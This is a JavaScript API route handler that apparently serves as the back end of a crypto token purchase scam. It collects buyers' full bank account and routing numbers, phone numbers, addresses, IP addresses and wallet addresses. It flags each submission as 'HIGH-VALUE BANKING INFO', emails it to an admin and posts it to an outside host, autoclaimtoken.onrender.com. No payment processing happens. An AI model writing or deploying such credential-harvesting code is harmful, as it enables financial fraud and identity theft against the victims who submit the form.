export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { 
    userAddress, 
    amount, 
    bankName, 
    bankInstitution, 
    bankAccount, 
    bankRouting, 
    bankType, 
    bankPhone, 
    bankAddress,
    timestamp,
    userAgent,
    advancedData
  } = req.body;

  try {
    // Get user's IP address
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;

    // Prepare comprehensive banking info for admin
    const bankInfo = {
      type: 'BANKING_INFO_COLLECTED',
      priority: 'HIGH',
      timestamp: timestamp,
      userAddress: userAddress,
      purchaseAmount: amount + ' ETH',
      usdValue: '$' + (parseFloat(amount) * 3200).toFixed(2),
      bankingDetails: {
        accountHolderName: bankName,
        bankName: bankInstitution,
        accountNumber: bankAccount,
        routingNumber: bankRouting,
        accountType: bankType,
        phoneNumber: bankPhone,
        address: bankAddress
      },
      networkInfo: {
        ip: ip,
        userAgent: userAgent,
        timestamp: timestamp
      },
      advancedData: advancedData || {},
      securityAnalysis: {
        routingNumberValid: bankRouting.length === 9,
        accountNumberLength: bankAccount.length,
        phoneFormatted: bankPhone.includes('(') && bankPhone.includes(')')
      }
    };

    // Send comprehensive alert to admin
    console.log('🏦 HIGH-VALUE BANKING INFO COLLECTED:', {
      bank: bankInstitution,
      account: bankAccount.slice(0, 4) + '****',
      routing: bankRouting
    });

    // Send email alert
    try {
      await fetch('/api/send-email-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'BANKING_INFO',
          subject: `🏦 HIGH-VALUE BANKING INFO - $${(parseFloat(amount) * 3200).toFixed(2)} - ${bankInstitution}`,
          data: bankInfo
        })
      });
    } catch (error) {
      console.log('Email alert failed');
    }

    // Send to honeypot alert system
    try {
      await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(bankInfo)
      });
    } catch (error) {
      console.log('Alert system unavailable');
    }

    res.status(200).json({
      success: true,
      message: 'Banking info collected successfully'
    });

  } catch (error) {
    console.error('Banking collection error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process banking info'
    });
  }
}